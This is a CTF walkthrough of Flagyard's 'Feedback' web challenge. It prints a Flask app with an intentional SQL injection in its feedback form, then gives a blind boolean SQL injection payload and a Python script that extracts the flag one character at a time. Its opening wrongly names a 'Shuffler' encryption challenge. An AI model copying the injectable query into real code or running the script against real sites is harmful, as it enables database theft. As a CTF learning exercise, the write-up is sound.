# Feedback - Flagyard CTF Walkthrough

This is a walkthrough for solving the **Shuffler** challenge from the **Flagyard CTF**. The challenge involves reversing a custom encryption process to retrieve the original input that satisfies the conditions.

## Challenge Description

We are provided with the server-side source code of a web application. Let’s analyze it to identify vulnerabilities and determine how to exploit them.

---

# app.py
```python
from flask import Flask, render_template, request, redirect, url_for, session
import sqlite3
from sqlite3 import Error
import string
import random
import re

class Database:
    def __init__(self, db):
        self.db = db
        try:
            self.conn = sqlite3.connect(self.db, check_same_thread=False)
        except:
            self.conn = None

    def gen_random(self) -> str:
        letters = string.ascii_lowercase
        result_str = ''.join(random.choice(letters) for i in range(15))
        return result_str

    def execute_statement(self, create_table_sql) -> str:
        try:
            c = self.conn.cursor()
            return c.execute(create_table_sql)
        except Error as e:
            return e

    def create_tables(self) -> str:
        create_user_table = """
            CREATE TABLE IF NOT EXISTS user(
                id integer PRIMARY KEY,
                username text NOT NULL,
                password text NOT NULL
            );
        """
        create_user_feedback = """
            CREATE TABLE IF NOT EXISTS feedback(
                username text NOT NULL,
                feedback text NOT NULL
            );
        """
        create_flag_table = """
            CREATE TABLE IF NOT EXISTS flag(
                flag text NOT NULL
            );
        """
        if self.conn is not None:
            self.execute_statement(create_user_table)
            self.execute_statement(create_flag_table)
            self.execute_statement(create_user_feedback)
            return "Tables have been created"
        else:
            return "Something went wrong"

    def insert(self, statement, *args) -> bool:
        try:
            sql = statement
            curs = self.conn.cursor()
            curs.execute(sql, (args))
            self.conn.commit()
            return True
        except:
            return False   

    def select(self, statement, *args) -> list:
        curs = self.conn.cursor()
        curs.execute(statement, (args))
        rows = curs.fetchall()
        result = []
        for row in rows:
            result.append(row)
        return result

app = Flask(__name__)
app.config['SECRET_KEY'] = 'e66b6950164958de940d9d117f665c98'

def blacklist(string):
    string = string.lower()
    blocked_words = ['exec', 'load', 'blob', 'glob', 'union', 'join', 'like', 'match', 'regexp', 'in', 'limit', 'order', 'hex', 'where']
    for word in blocked_words:
        if word in string:
            return True
    return False

@app.route('/', methods=['GET', 'POST'])
def index():
    if 'loggedin' in session:
        msg = ''
        feedback = ''
        if request.method == 'POST' and 'feedback' in request.form:
            feedback = request.form['feedback']
            if blacklist(feedback):
                msg = 'Forbidden word detected'
            else:
                query = db.insert("INSERT INTO feedback(username, feedback) VALUES(?,'%s')" % feedback, session['username'])
                if query is not True:
                    msg = 'Something went wrong'
                    return render_template('home.html', username=session['username'], msg=msg)
                feedback = "Thanks for the feedback"
        return render_template('home.html', username=session['username'], feedback=feedback, msg=msg)
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    msg = ''
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
        username = request.form['username']
        password = request.form['password']
        account = db.select("SELECT * FROM user where username = ? and password = ?", username, password)
        if account:
            session['loggedin'] = True
            session['id'] = account[0][0]
            session['username'] = account[0][1]
            return redirect(url_for('index'))
        else:
            msg = 'Incorrect username/password!'
    return render_template('index.html', msg=msg)

@app.route('/register', methods=['GET', 'POST'])
def register():
    msg = ''
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
        username = request.form['username']
        password = request.form['password']
        
        account = db.select("SELECT * FROM user where username = ? and password = ?", username, password)
        if account:
            msg = 'Account already exists!'
        elif not re.match(r'[A-Za-z0-9]+', username):
            msg = 'Username must contain only characters and numbers!'
        elif not username or not password:
            msg = 'Please fill out the form!'
        else:
            db.insert("INSERT INTO user(username, password) Values (?,?)", username, password)
            msg = 'You have successfully registered!'
    elif request.method == 'POST':
        msg = 'Please fill out the form!'
        
    return render_template('register.html', msg=msg)

@app.route('/logout')
def logout():
    session.pop('loggedin', None)
    session.pop('id', None)
    session.pop('username', None)
    return redirect(url_for('login'))

if '__main__' == __name__:
    db = Database('./sqlite.db')
    db.create_tables()
    db.insert("INSERT INTO flag(flag) VALUES (?)", "FlagY{fake_flag}")
    app.run(host='0.0.0.0', port=5000)
```

---

## Analysis

The application is a simple web app that inserts a fake flag (FlagY{fake_flag}) into the flag table in a SQLite database. It provides registration and login functionality. After logging in, users can submit feedback, which is stored in the feedback table.

### Vulnerability

The vulnerability lies in the feedback submission query:
```python
query = db.insert("INSERT INTO feedback(username, feedback) VALUES(?,'%s')" % feedback, session['username'])
```

This query is vulnerable to SQL injection because user input (feedback) is directly inserted into the query without proper parameterization. However, two challenges limit exploitation:

  1. Keyword Filtering: The application filters potentially dangerous SQL keywords like exec, load, and match using the blacklist() function.

  2. No Direct Reflection: The query only inserts data into the database without reflecting any results back to the user, making it harder to exploit.

---

## Exploitation

To exploit this vulnerability, we need to:

  1. Determine True/False Conditions: Use the application's behavior to infer whether a query is true or false.

  2. Use Conditional Logic: Leverage SQLite's CASE expression to create conditional queries.

### Example Payload

```sql
' OR CASE WHEN SUBSTR((SELECT flag FROM flag),1,1)='F' THEN 1 ELSE (1/0) END AND '1
```

##  Explanation:

       ' OR breaks out of the current query.

        CASE WHEN SUBSTR((SELECT flag FROM flag),1,1)='F' checks if the first character of the flag is F.

        THEN 1 returns 1 if the condition is true (no error).

        ELSE (1/0) causes an error if the condition is false.

        END AND '1 ensures the query is valid.

### Expected Results

    If the first character is F, the application responds with "Thanks for the feedback."

    If not, it responds with "Something went wrong."

## Automated Exploitation Script

Here’s a Python script to automate the exploitation process:

```python
import requests
import string

# Replace with your instance URL and credentials
base_url = "Your_Instance_URL"
login_url = base_url + "/login"
add_note_url = base_url

charset = string.digits + string.ascii_letters + "{}_"
flag = ""
position = 1

username = "your_username"
password = "your_password"
session = requests.Session()

def login():
    login_data = {"username": username, "password": password}
    response = session.post(login_url, data=login_data)
    if "Welcome" in response.text:
        print("[+] Login successful!")
    else:
        print("[-] Login failed.")
        exit()

def test_char_for_position(char, position):
    payload = f"' OR CASE WHEN SUBSTR((SELECT flag FROM flag),{position},1)='{char}' THEN 1 ELSE (1/0) END AND '1"
    data = {"feedback": payload}
    response = session.post(add_note_url, data=data)
    if "Thanks for the feedback" in response.text:
        return True
    return False

login()
while True:
    for char in charset:
        print(f"[+] {flag}{char}")
        if test_char_for_position(char, position):
            flag += char
            position += 1
            break
    if flag[::-1][0] == "}":
        break
    
print(f"\n[+] Extracted flag: {flag}")
```

## Conclusion

This challenge demonstrates how to exploit a blind SQL injection vulnerability in a web application. By leveraging conditional logic and the application's behavior, we can extract sensitive information like the flag. This exercise deepened my understanding of blind SQL injection and its exploitation techniques.

---

### Contact me: 

<a href="https://www.instagram.com/t2tt/" style="color: white; text-decoration: none;">
  <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram" width="30" />
</a>

